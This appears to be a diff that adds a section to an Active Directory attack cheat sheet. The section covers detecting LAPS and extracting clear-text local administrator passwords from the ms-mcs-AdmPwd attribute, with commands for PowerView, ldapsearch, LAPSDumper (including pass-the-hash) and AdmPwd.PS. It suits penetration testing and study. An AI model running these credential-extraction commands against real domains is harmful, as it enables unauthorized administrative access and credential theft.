@@ -31,6 +31,7 @@
       - [Spray a pre-generated passwords list](#spray-a-pre-generated-passwords-list)
       - [Spray passwords against the RDP service](#spray-passwords-against-the-rdp-service)
     - [Password in AD User comment](#password-in-ad-user-comment)
+    - [Reading LAPS Password](#reading-laps-password)
     - [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
       - [Using Mimikatz](#using-mimikatz)
       - [Using Meterpreter](#using-meterpreter)
@@ -971,6 +972,45 @@ or dump the Active Directory and `grep` the content.
 ```powershell
 ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
 ```
+
+
+### Reading LAPS Password
+
+> Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure. 
+
+#### Determine if LAPS is installed
+
+```ps1
+Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'
+Get-FileHash 'c:\program files\LAPS\CSE\Admpwd.dll'
+Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
+```
+
+#### Extract LAPS password
+
+> The "ms-mcs-AdmPwd" a "confidential" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users
+
+* Powerview
+    ```powershell
+    PS > Import-Module .\PowerView.ps1
+    PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
+    ```
+
+* ldapsearch
+    ```powershell
+    ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
+    ```
+
+* LAPSDumper - https://github.com/n00py/LAPSDumper
+    ```powershell
+    python laps.py -u user -p password -d domain.local
+    python laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
+    ```
+
+* Powershell AdmPwd.PS
+    ```powershell
+    foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
+    ```
 
 ### Pass-the-Ticket Golden Tickets
 
